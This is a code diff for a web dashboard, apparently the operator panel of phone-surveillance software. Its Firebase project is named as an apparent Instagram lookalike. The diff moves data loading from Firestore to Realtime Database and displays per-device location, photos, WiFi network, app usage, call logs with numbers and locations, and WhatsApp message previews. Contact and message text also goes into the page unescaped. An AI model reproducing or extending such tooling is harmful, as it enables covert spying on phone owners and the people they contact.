@@ -134,7 +134,6 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <script>
 // --- Firebase Config ---
 const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
-const FIRESTORE = 'https://firestore.googleapis.com/v1/projects/instgram-7148c/databases/(default)/documents';
 const PKT = 'Asia/Karachi';
 
 // --- State ---
@@ -153,7 +152,6 @@ let playbackRunning = false;
 let lastUpdateTime = 0;
 let playbackIdx = 0;
 let playbackTimer = null;
-let cameraHome = null;
 
 // --- Poll Timers ---
 let pollTimers = [];
@@ -401,68 +399,10 @@ async function pollAll() {
 }
 
 // --- Firebase helpers ---
+// RTDB-only approach — Firebase RTDB sends Access-Control-Allow-Origin: *
+// on all GET responses, so plain fetch() works from ANY browser including iOS Safari.
+// Firestore REST API does NOT support browser CORS reliably, so we never use it here.
 
-// Firestore REST API
-async function fetchFirestore(path) {
-  trackRead();
-  try {
-    const r = await fetch(`${FIRESTORE}/${path}`);
-    if (!r.ok) return null;
-    return r.json();
-  } catch { return null; }
-}
-
-async function listFirestoreDocs(path) {
-  trackRead();
-  try {
-    const r = await fetch(`${FIRESTORE}/${path}?pageSize=50`);
-    if (!r.ok) return [];
-    const data = await r.json();
-    return data.documents || [];
-  } catch { return []; }
-}
-
-async function runFirestoreQuery(parentDoc, collectionId, field, op, value, limit = 50) {
-  trackRead();
-  try {
-    const body = JSON.stringify({
-      structuredQuery: {
-        from: [{ collectionId }],
-        where: { fieldFilter: { field: { fieldPath: field }, op, value: { integerValue: String(value) } } },
-        orderBy: [{ field: { fieldPath: field }, direction: 'ASCENDING' }],
-        limit
-      }
-    });
-    const r = await fetch(`${FIRESTORE}/${parentDoc}:runQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body
-    });
-    if (!r.ok) return [];
-    const results = await r.json();
-    return results.filter(r => r.document).map(r => r.document);
-  } catch { return []; }
-}
-
-async function fetchFirestoreCollectionGroup(collectionId, limit = 50) {
-  trackRead();
-  try {
-    const body = JSON.stringify({
-      structuredQuery: {
-        from: [{ collectionId, allDescendants: true }],
-        limit
-      }
-    });
-    const r = await fetch(`${FIRESTORE}:runQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body
-    });
-    if (!r.ok) return [];
-    const results = await r.json();
-    return results.filter(r => r.document).map(r => r.document);
-  } catch { return []; }
-}
-
-// FIX: Replace JSONP with plain fetch() — Firebase RTDB REST API supports CORS natively.
-// The old JSONP approach (dynamic <script> injection) is blocked by iOS Safari's
-// stricter Content Security Policy, which is why data never loaded on iPhone.
 async function fetchRTDB(path, query) {
   trackRead();
   try {
@@ -473,69 +413,42 @@ async function fetchRTDB(path, query) {
   } catch { return null; }
 }
 
-async function fetchMetrics(id) {
-  const doc = await fetchFirestore(`devices/${id}/metrics/latest`);
-  if (doc && doc.fields) return firestoreFieldsToObj(doc.fields);
-  const m = await fetchRTDB(`devices/${id}/metrics/latest`);
-  return m;
-}
-
-function firestoreFieldsToObj(fields) {
-  const o = {};
-  for (const k in fields) {
-    const v = fields[k];
-    if (v.stringValue !== undefined) o[k] = v.stringValue;
-    else if (v.integerValue !== undefined) o[k] = parseInt(v.integerValue);
-    else if (v.doubleValue !== undefined) o[k] = v.doubleValue;
-    else if (v.booleanValue !== undefined) o[k] = v.booleanValue;
-    else o[k] = v;
-  }
-  return o;
-}
-
 async function fetchDevices() {
-  const infoDocs = await fetchFirestoreCollectionGroup('info', 20);
-  if (infoDocs && infoDocs.length) {
-    devices = {};
-    const sel = document.getElementById('deviceSelect');
-    const opts = [];
-    for (const doc of infoDocs) {
-      const parts = doc.name.split('/');
-      const idx = parts.indexOf('devices');
-      if (idx < 0 || !parts[idx + 1]) continue;
-      const id = parts[idx + 1];
-      const fields = doc.fields || {};
-      const model = fields.deviceModel?.stringValue || '';
-      const manuf = fields.manufacturer?.stringValue || '';
-      const lastSync = fields.lastSync?.stringValue || '';
-      const label = [manuf, model].filter(Boolean).join(' ') || id.slice(0, 8);
-      devices[id] = { id, label, model, manuf, lastSync };
-      opts.push(`<option value="${id}">${label}</option>`);
-    }
-    sel.innerHTML = opts.join('');
-    if (!selectedDevice || !devices[selectedDevice]) selectedDevice = Object.keys(devices)[0];
-    sel.value = selectedDevice;
-    return;
-  }
-
-  // Fallback: RTDB fetch (now using fetch() instead of JSONP)
-  const data = await fetchRTDB('devices', 'shallow=true');
-  if (!data) {
+  // Fetch all device IDs via shallow=true (fast, minimal data)
+  const keys = await fetchRTDB('devices', 'shallow=true');
+  if (!keys || typeof keys !== 'object') {
     document.getElementById('statusDot').textContent = '\u2716 No data';
     document.getElementById('statusDot').className = 'status warn';
     return;
   }
-  devices = Object.keys(data).reduce((acc, id) => { acc[id] = { id, label: id.slice(0,8) + '...' }; return acc; }, {});
+  devices = {};
   const sel = document.getElementById('deviceSelect');
-  const keys = Object.keys(devices);
-  if (!keys.length) {
+  const ids = Object.keys(keys);
+  if (!ids.length) {
     document.getElementById('statusDot').textContent = '\u2716 No devices';
     document.getElementById('statusDot').className = 'status warn';
     return;
   }
-  sel.innerHTML = keys.map(k => `<option value="${k}">${devices[k].label}</option>`).join('');
-  if (!selectedDevice || !keys.includes(selectedDevice)) selectedDevice = keys[0];
+  // Enrich with model names via info nodes (non-blocking)
+  ids.forEach(id => { devices[id] = { id, label: id.slice(0, 8) + '...', model: '', manuf: '' }; });
+  sel.innerHTML = ids.map(k => `<option value="${k}">${devices[k].label}</option>`).join('');
+  if (!selectedDevice || !ids.includes(selectedDevice)) selectedDevice = ids[0];
   sel.value = selectedDevice;
+
+  // Enrich with device model names (async — non-blocking)
+  (async () => {
+    try {
+      for (const id of ids) {
+        const info = await fetchRTDB(`devices/${id}/info`);
+        if (info && info.deviceModel) {
+          const label = [info.manufacturer, info.deviceModel].filter(Boolean).join(' ') || id.slice(0, 8);
+          if (devices[id]) devices[id].label = label;
+        }
+      }
+      const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+      if (opt && devices[selectedDevice]) opt.textContent = devices[selectedDevice].label;
+    } catch {}
+  })();
 }
 
 async function pollLocation() {
@@ -549,7 +462,7 @@ async function pollLocation() {
 
 async function pollMeta() {
   if (!selectedDevice) return;
-  const m = await fetchMetrics(selectedDevice);
+  const m = await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
   if (!m) return;
   document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
   document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
@@ -569,31 +482,25 @@ async function pollMeta() {
   }
 }
 
-let lastPhotoTs = 0;
 async function pollPhotos() {
   if (!selectedDevice) return;
-  let docs;
-  if (lastPhotoTs > 0) {
-    docs = await runFirestoreQuery(`devices/${selectedDevice}`, 'photos', 'timestamp', 'GREATER_THAN', lastPhotoTs, 10);
-  } else {
-    docs = await listFirestoreDocs(`devices/${selectedDevice}/photos`);
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/photos`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    document.getElementById('photoGrid').innerHTML = '<div class="label">No photos yet</div>';
+    return;
   }
   const grid = document.getElementById('photoGrid');
-  let newCount = 0;
-  for (const doc of docs) {
-    const ts = parseInt(doc.name.split('/').pop());
+  const entries = Object.entries(rtdbData).sort((a, b) => (parseInt(b[0]) || 0) - (parseInt(a[0]) || 0));
+  for (const [ts, doc] of entries) {
     if (cachedPhotos[ts]) continue;
-    const fields = doc.fields || {};
-    const data = fields.data?.stringValue || '';
-    const docTs = parseInt(fields.timestamp?.integerValue || '0');
-    if (docTs > lastPhotoTs) lastPhotoTs = docTs;
+    const data = doc.data || '';
+    const docTs = parseInt(ts);
     if (data && data.startsWith('/9j/')) {
-      newCount++;
       cachedPhotos[ts] = data;
       const img = document.createElement('img');
       img.src = 'data:image/jpeg;base64,' + data;
-      img.alt = pkt(ts);
-      img.title = pkt(ts);
+      img.alt = pkt(docTs);
+      img.title = pkt(docTs);
       grid.prepend(img);
     }
   }
@@ -602,16 +509,16 @@ async function pollPhotos() {
 
 async function pollApps() {
   if (!selectedDevice) return;
-  const docs = await listFirestoreDocs(`devices/${selectedDevice}/apps`);
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/apps`);
   const chart = document.getElementById('appsChart');
-  if (!docs || !docs.length) {
+  if (!rtdbData || typeof rtdbData !== 'object') {
     chart.innerHTML = '<div class="label">No app usage data yet</div>';
     return;
   }
-  const sorted = docs.map(d => {
-    const f = d.fields || {};
-    return { name: f.appName?.stringValue || '?', ms: parseInt(f.totalForegroundMs?.integerValue || '0') };
-  }).sort((a, b) => b.ms - a.ms).slice(0, 15);
+  const sorted = Object.values(rtdbData).map(v => ({
+    name: v.appName || v.packageName || '?',
+    ms: parseInt(v.totalForegroundMs || '0')
+  })).sort((a, b) => b.ms - a.ms).slice(0, 15);
   const maxMs = sorted.length ? sorted[0].ms : 1;
   chart.innerHTML = sorted.map(a => `
     <div class="bar-row">
@@ -623,7 +530,14 @@ async function pollApps() {
 
 async function pollHistory() {
   if (!selectedDevice) return;
-  const docs = await listFirestoreDocs(`devices/${selectedDevice}/timeline`);
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>';
+    document.getElementById('callsBody').innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+    return;
+  }
+  const docs = Object.values(rtdbData)
+    .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
   renderTimeline(docs.slice(0, 30));
   renderCalls(docs.slice(0, 30));
 }
@@ -725,7 +639,7 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
 function renderTimeline(docs) {
   const list = document.getElementById('timelineList');
   const filtered = docs.filter(d => {
-    const type = (d.fields?.type?.stringValue || '').toLowerCase();
+    const type = (d.type || '').toLowerCase();
     if (timelineFilter === 'all') return true;
     if (timelineFilter === 'location') return type === 'location';
     if (timelineFilter === 'call') return type.includes('call');
@@ -733,31 +647,32 @@ function renderTimeline(docs) {
     return true;
   }).slice(0, 50);
   list.innerHTML = filtered.map(d => {
-    const f = d.fields || {};
-    const type = f.type?.stringValue || '';
-    const ts = parseInt(f.ts_ms?.integerValue || '0');
+    const type = d.type || '';
+    const ts = parseInt(d.ts_ms || '0');
     const icon = type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : '\u{1F4CD}';
-    const contact = f.contactName?.stringValue || f.contact?.stringValue || '';
-    const msg = f.messagePreview?.stringValue || '';
-    const dur = f.duration?.stringValue || '';
-    const dir = f.direction?.stringValue || '';
+    const contact = d.contactName || d.contact || '';
+    const msg = d.messagePreview || '';
+    const dur = d.duration || '';
+    const dir = d.direction || '';
     return `<div class="card">
       <div class="time">${icon} ${pkt(ts)}</div>
-      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur : ''}${dir ? ' ['+dir+']' : ''}</div>
+      <div>${contact}${msg ? ': ' + msg : ''}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}</div>
     </div>`;
   }).join('') || '<div class="label">No entries</div>';
 }
 
 function renderCalls(docs) {
   const body = document.getElementById('callsBody');
-  const calls = docs.filter(d => (d.fields?.type?.stringValue || '').includes('call')).slice(0, 50);
+  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 50);
   body.innerHTML = calls.map(d => {
-    const f = d.fields || {};
-    const ts = parseInt(f.ts_ms?.integerValue || '0');
-    const num = f.contactName?.stringValue || f.contact?.stringValue || '--';
-    const dur = f.duration?.stringValue || '--';
-    const dir = f.direction?.stringValue || '--';
-    return `<tr><td>${pktShort(ts)}</td><td>${num}</td><td>${dur}</td><td>${dir}</td></tr>`;
+    const ts = parseInt(d.ts_ms || '0');
+    const name = d.contactName || d.contact || '';
+    const number = d.contactNumber || '';
+    const numDisplay = name && number ? `${name} (${number})` : name || number || '--';
+    const dur = d.duration || '--';
+    const dir = d.direction || '--';
+    const loc = d.location || '';
+    return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:11px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
   }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
 }
 
